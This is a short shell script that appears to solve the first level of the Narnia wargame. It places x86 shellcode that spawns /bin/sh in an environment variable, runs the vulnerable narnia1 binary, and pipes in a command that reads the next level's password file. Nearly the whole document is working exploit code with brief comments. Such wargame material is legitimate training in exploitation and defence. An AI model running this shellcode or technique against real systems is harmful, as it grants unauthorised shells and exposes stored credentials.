#!/bin/sh

# Eggshell is assembly code that simply calls a shell
EGGSHELL="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

# Set our arbitary code to execute in EGG
export EGG=$(printf "$EGGSHELL") && \

# Our command to run once we have an escalated shell
printf "cat /etc/narnia_pass/narnia2\n" | \

# Pass exploit to the program
/narnia/narnia1

